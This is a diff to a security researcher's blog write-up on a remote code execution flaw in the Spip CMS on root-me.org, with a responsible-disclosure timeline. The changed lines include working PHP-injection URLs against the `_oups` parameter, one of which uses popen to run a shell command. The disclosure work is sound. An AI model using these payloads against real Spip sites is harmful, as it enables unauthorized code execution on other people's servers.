@@ -86,7 +86,7 @@ Even though "a magician never reveals his secrets", here are the core steps of m
 1. Start the env, launch burp, chromium (with foxy proxy)
 1. Navigate on Spip, click on buttons, submit forms, access pages, ...
 1. From burp, extract every visited url with their parameters
-1. Run Crawlz, be as exhaustive as possible (catch even false positives and broken urls)
+1. Run Crawlz, be as exhaustive as possible (keep even false positives and broken urls)
 1. Triage the urls, remove the odd ones
 1. Add some magic here `¯\_(ツ)_/¯`
 1. Run Sulfateuse, (a bit like a custom burp intruder)
@@ -95,6 +95,8 @@ Even though "a magician never reveals his secrets", here are the core steps of m
 One more side note! I used a previous project [Wordpress Subpath Auditor](https://thinkloveshare.com/en/hacking/wordpress_subpath_auditor/) to get more insights on Spip and check if some quick-wins were already reachable. I found an eval (powerful primitive for code execution) with partially controlled input, but the sanitization in place (alphanum regex whitelisting) was too restrictive. More on that later!
 
 I still noticed one huge limitation for WoSuAu: As it patches the php code in order to analyze it, dynamically generated files are not instrumented as they are only present after the tool is started. This definitely induces false negatives. Instrumenting php itself would have been more efficient... One day maybe?
+
+The tests were ran with the builtin php server `php -S 0.0.0.0:80`. I was too lazy to setup multi-threading, and speed definitely isn't the main concern for Spip folks, not it is for me. Sulfateuse ran for approx 10 hours, I slept on it, and the next morning was like one of these christmas day!
 
 
 # Triage the findings
@@ -308,8 +310,8 @@ I know this is wayyy too small, text version below..
 Yellow: What I first aimed while auditing `eval()`, safe context\
 Red: Where it got reflected and then, not-so-safe context\
 ```html
-https://www.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups='<?php debug_print_backtrace();die();
-https://www.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups=%27%3C?php%20debug_print_backtrace%28%29%3Bdie%28%29%3B
+https://www.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups='<?php debug_print_backtrace();die();?>
+https://www.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups=%27%3C?php%20debug_print_backtrace();die();?%3E
 ```
 <img class="img_big" src="/hacking/rce_on_spip_and_root_me/reflected_oups.jpg" alt="reflected_oups">
 <img class="img_med" src="/hacking/rce_on_spip_and_root_me/eval_debug.jpg" alt="eval_debug">
@@ -317,8 +319,8 @@ https://www.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_
 <img class="img_big" src="/hacking/rce_on_spip_and_root_me/phpinfo.jpg" alt="phpinfo">
 1. Bypass the restricted_functions with `popen` which wasn’t restricted
 ```html
-https://www.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups='<?php echo fread(popen("id", "r"), 300);?>'
-https://www.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups=%27%3C?php%20echo%20fread(popen(%22id%22,%20%22r%22),%20300);?%3E%27
+https://www.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups='<?php echo fread(popen("id", "r"), 300);?>
+https://www.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste_aut=statut&deplacer=oui&_oups=%27%3C?php%20echo%20fread(popen(%22id%22,%20%22r%22),%20300);?%3E
 ```
 <img class="img_big" src="/hacking/rce_on_spip_and_root_me/cmd_id.jpg" alt="cmd_id">
 1. Profit?!
@@ -372,7 +374,8 @@ Another security feature has been added and enforced for admins: GPG
 - 17/05/2020: Still in touch, first SQLi reported
 - XX/05/2020: Patch for many XSS ans SQLi tested and validated (spip side)
 - XX/05/2020: W00t, got a shell?! (quickly reported & patched)
-- ??/??/2020: Finaly publicly disclosed by spip, article finaly published!
+- ??/??/2020: Finally publicly disclosed by spip, waiting a few days...
+- ??/??/2020: Article published!
 
 
 # Conclusion?
